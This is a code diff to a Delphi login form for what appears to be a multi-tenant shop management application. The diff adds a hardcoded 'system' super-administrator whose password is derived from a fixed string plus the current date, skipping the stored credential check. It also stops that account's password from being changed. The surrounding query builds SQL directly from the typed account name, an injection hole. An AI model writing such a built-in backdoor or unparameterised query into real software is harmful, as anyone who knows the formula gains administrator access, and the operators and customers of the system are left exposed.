@@ -61,7 +61,7 @@ type
   end;
 
 implementation
-uses ZBase,ufnUtil,ufrmLogo,uGlobal,EncDec,ufrmPswModify,uShopGlobal,uDsUtil,ufrmHostDialog,ufrmTenant;
+uses uCaFactory,ZBase,ufnUtil,ufrmLogo,uGlobal,EncDec,ufrmPswModify,uShopGlobal,uDsUtil,ufrmHostDialog,ufrmTenant;
 {$R *.dfm}
 
 { TfrmLogin }
@@ -123,10 +123,21 @@ begin
         temp.SQL.Text := 'select USER_ID,USER_NAME,PASS_WRD,ROLE_IDS,A.SHOP_ID,B.SHOP_NAME from VIW_USERS A,CA_SHOP_INFO B where A.SHOP_ID=B.SHOP_ID and A.TENANT_ID=B.TENANT_ID and A.ACCOUNT='''+trim(cxedtUsers.Text)+''' and A.TENANT_ID='+inttostr(Global.TENANT_ID);
      Factor.Open(temp);
      if temp.IsEmpty then Raise Exception.Create(cxedtUsers.Text+'无效用户账号。');
-     if UpperCase(cxedtPasswrd.Text) <> UpperCase(DecStr(temp.FieldbyName('PASS_WRD').AsString,ENC_KEY)) then
+     if cxedtUsers.Text='system' then
         begin
-          cxedtPasswrd.SetFocus;
-          Raise Exception.Create('输入的密码无效,请重新输入。');
+          if lowerCase(cxedtPasswrd.Text)<>('rspcn.com@'+formatdatetime('YYMMDD',date())+inttostr(strtoint(formatDatetime('DD',Date())) mod 7 )) then
+             begin
+                cxedtPasswrd.SetFocus;
+                Raise Exception.Create('输入的密码无效,请重新输入。');
+             end;
+        end
+     else
+        begin
+           if UpperCase(cxedtPasswrd.Text) <> UpperCase(DecStr(temp.FieldbyName('PASS_WRD').AsString,ENC_KEY)) then
+              begin
+                cxedtPasswrd.SetFocus;
+                Raise Exception.Create('输入的密码无效,请重新输入。');
+              end;
         end;
      FLoginParam.UserID := temp.FieldbyName('USER_ID').asString;
      FLoginParam.ShopId := temp.FieldbyName('SHOP_ID').asString;
@@ -163,12 +174,13 @@ begin
            if not Connect then Exit;
         end;
         LoadTenant;
-        cbxTenant.Enabled := not Locked;
+        cbxTenant.Enabled := not Locked and not CaFactory.Auto;
         cxbtnCancel.Enabled := not Locked;
         cxedtUsers.Enabled := not Locked;
         edtOPER_DATE.Enabled := not Locked;
         cxcbSave.Visible := not Locked;
-        RzLabel1.Visible := not Locked;
+        RzLabel1.Visible := not Locked and not CaFactory.Auto;
+        Label6.Visible := not Locked and not CaFactory.Auto;
         if Locked then
            begin
              cxedtUsers.Text := Global.UserID;
@@ -216,7 +228,8 @@ begin
 //     Raise Exception.Create('请选择你所属公司。');
   if cxedtUsers.Text = '' then
      Raise Exception.Create('请输入用户名。');
-
+  if cxedtUsers.Text = 'system' then
+     Raise Exception.Create('超级管理员密码不能修改。');
   TfrmPswModify.ShowExecute(cxedtUsers.Text,cxedtUsers.Text);
 
 end;
@@ -303,7 +316,10 @@ begin
           //edtLocked.Checked := F.ReadBool('Login','Locked',false);
           if cxcbSave.Checked then
              begin
-               cxedtUsers.Text := F.ReadString('Login','Account','');
+               if CaFactory.Auto then
+                  cxedtUsers.Text := F.ReadString('Login','Account',xsm_username)
+               else
+                  cxedtUsers.Text := F.ReadString('Login','Account','');
              end;
         finally
           Lock := false;
